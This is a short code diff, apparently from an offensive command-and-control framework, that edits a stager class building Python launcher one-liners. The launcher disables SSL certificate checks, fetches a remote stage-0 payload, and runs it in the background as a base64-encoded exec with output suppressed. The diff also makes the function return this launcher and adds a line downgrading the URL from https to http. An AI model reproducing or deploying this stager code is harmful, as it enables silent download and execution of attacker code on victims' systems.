@@ -238,6 +238,7 @@ class Stagers:
         if "https" in stage0uri:
             # monkey patch ssl woohooo
             launcherBase += "import ssl;\nif hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context;\n"
+            stage0url = stage0url.replace("https:", "http:");
 
         launcherBase += "import sys, urllib2;"
         try:
@@ -279,7 +280,7 @@ class Stagers:
             launcher = "echo \"import sys,base64;exec(base64.b64decode('%s'));\" | python &>/dev/null &" % (launchEncoded)
         else:
             launcher = "echo \"%s\" | python &>/dev/null &" % (launchBase)
-        return launcherBase
+        return launcher
 
     def generate_hop_php(self, server, resources):
         """
